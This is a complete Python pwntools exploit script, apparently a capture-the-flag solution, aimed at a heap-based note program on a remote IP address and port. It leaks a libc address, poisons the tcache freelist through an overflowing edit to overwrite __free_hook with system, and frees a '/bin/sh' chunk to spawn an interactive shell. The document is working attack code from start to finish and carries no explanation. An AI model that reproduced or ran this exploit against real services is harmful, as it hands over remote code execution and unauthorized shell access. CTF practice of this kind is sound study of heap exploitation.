from pwn import *

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = remote('34.81.158.137', 10102)

def create(size, name = b'a', data = b'a'):
	p.sendlineafter(b'> ', b'1')
	p.sendafter(b': ', name)
	p.sendlineafter(b': ', str(size).encode('utf-8'))
	p.sendafter(b': ', data)

def delete(idx):
	p.sendlineafter(b'> ', b'4')
	p.sendlineafter(b': ', str(idx).encode('utf-8'))

def view():
	p.sendlineafter(b'> ', b'2')

def edit(idx, name = b'a', data = b'a'):
	p.sendlineafter(b'> ', b'3')
	p.sendlineafter(b': ', str(idx).encode('utf-8'))
	p.sendafter(b': ', name)
	p.sendafter(b': ', data)

create(0x480)
create(0x480)
delete(0)
create(0x18, b'b', b'\x01')
create(0x18, b'b', b'\x01')
view()

p.recvuntil(b'- ')
p.recvuntil(b'- ')
p.recvuntil(b'- ')

libc.address = u64(p.recvline().strip().ljust(8, b'\x00')) - 0x1ebb01
print(hex(libc.address))

free_hook = libc.sym['__free_hook']
system = libc.sym['system']

create(0x18)
create(0x18)
create(0x18)

delete(4)
delete(3)

edit(2, b'\x00'*0x10 + b'\xff', b'b'*0x18 + p64(0x31) + p64(free_hook))
create(0x18, b'/bin/sh\x00', b'/bin/sh\x00')
create(0x18, p64(system), p64(system))

delete(3)

p.interactive()